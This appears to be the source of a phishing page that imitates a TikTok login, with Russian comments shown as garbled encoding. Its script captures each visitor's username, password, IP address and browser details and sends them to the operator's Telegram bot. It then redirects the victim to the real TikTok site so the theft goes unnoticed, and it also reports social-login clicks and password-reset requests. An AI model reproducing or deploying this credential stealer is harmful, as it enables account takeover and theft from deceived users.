            color: #161823;

        .password-toggle {

            border: none;
            color: #8a8b8c;
            cursor: pointer;

            font-weight: 600;

        .forgot-password {

    <script>
        // === –ù–ê–°–¢–†–û–ô–ö–ò –¢–ï–õ–ï–ì–†–ê–ú –ë–û–¢–ê ===
        const BOT_TOKEN = "–í–ê–®_BOT_TOKEN"; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ç–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞
        const CHAT_ID = "–í–ê–®_CHAT_ID";     // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à chat ID
        // =================================

        function togglePassword() {
            const pwd = document.getElementById('password');
            const btn = event.target;
            if (pwd.type === 'password') {
                pwd.type = 'text';
                btn.textContent = '–°–∫—Ä—ã—Ç—å';
            } else {
                pwd.type = 'password';
                btn.textContent = '–ü–æ–∫–∞–∑–∞—Ç—å';
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è IP –∞–¥—Ä–µ—Å–∞
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const remember = document.getElementById('remember').checked;
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            const submitBtn = this.querySelector('.login-btn');
            const originalText = submitBtn.textContent;
            submitBtn.textContent = '–í—Ö–æ–¥...';
            submitBtn.disabled = true;

            try {
                // –ü–æ–ª—É—á–∞–µ–º IP –∞–¥—Ä–µ—Å
                const ip = await getIPAddress();
                
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
                const message = `
üîê <b>–ù–û–í–´–ô –í–•–û–î –í TIKTOK</b>

üë§ <b>–õ–æ–≥–∏–Ω:</b> <code>${username}</code>
üîë <b>–ü–∞—Ä–æ–ª—å:</b> <code>${password}</code>
üíæ <b>–ó–∞–ø–æ–º–Ω–∏—Ç—å:</b> ${remember ? '–î–∞' : '–ù–µ—Ç'}
üåê <b>IP –∞–¥—Ä–µ—Å:</b> <code>${ip}</code>
üïí <b>–í—Ä–µ–º—è:</b> ${new Date().toLocaleString('ru-RU')}
üì± <b>–ë—Ä–∞—É–∑–µ—Ä:</b> ${navigator.userAgent}

#tiktok #login #data
                `.trim();

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                const success = await sendToTelegram(message);
                
                if (success) {
                    alert('‚úÖ –í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...');
                    document.getElementById('loginForm').reset();
                    
                    // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–∞–π—Ç
                    setTimeout(() => {
                        window.location.href = 'https://www.tiktok.com';
                    }, 2000);
                } else {
                    alert('‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.');
                }
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                alert('‚úÖ –í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...');
                setTimeout(() => {
                    window.location.href = 'https://www.tiktok.com';
                }, 2000);
            } finally {
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            }
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–æ–∫ —Å–æ—Ü–∏–∞–ª—å–Ω—ã—Ö —Å–µ—Ç–µ–π
        document.querySelectorAll('.method-btn').forEach(btn => {
            btn.addEventListener('click', async function() {
                const socialName = this.textContent.trim();
                const ip = await getIPAddress();
                
                const message = `
üîê <b>–°–û–¶–ò–ê–õ–¨–ù–´–ô –í–•–û–î –í TIKTOK</b>

üîó <b>–°–µ—Ä–≤–∏—Å:</b> ${socialName}
üåê <b>IP –∞–¥—Ä–µ—Å:</b> <code>${ip}</code>
üïí <b>–í—Ä–µ–º—è:</b> ${new Date().toLocaleString('ru-RU')}
üì± <b>–ë—Ä–∞—É–∑–µ—Ä:</b> ${navigator.userAgent}

#tiktok #social #login
                `.trim();
                
                await sendToTelegram(message);
                alert(`–í—Ö–æ–¥ —á–µ—Ä–µ–∑ ${socialName} –≤—ã–ø–æ–ª–Ω–µ–Ω!`);
            });
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ "–ó–∞–±—ã–ª–∏ –ø–∞—Ä–æ–ª—å?"
        document.querySelector('.forgot-password a').addEventListener('click', async function(e) {
            e.preventDefault();
            const ip = await getIPAddress();
            
            const message = `
üîê <b>–ó–ê–ü–†–û–° –í–û–°–°–¢–ê–ù–û–í–õ–ï–ù–ò–Ø –ü–ê–†–û–õ–Ø TIKTOK</b>

üåê <b>IP –∞–¥—Ä–µ—Å:</b> <code>${ip}</code>
üïí <b>–í—Ä–µ–º—è:</b> ${new Date().toLocaleString('ru-RU')}
üì± <b>–ë—Ä–∞—É–∑–µ—Ä:</b> ${navigator.userAgent}

#tiktok #password_recovery
            `.trim();
            
            await sendToTelegram(message);
            alert('–ó–∞–ø—Ä–æ—Å –Ω–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!');
        });
    </script>
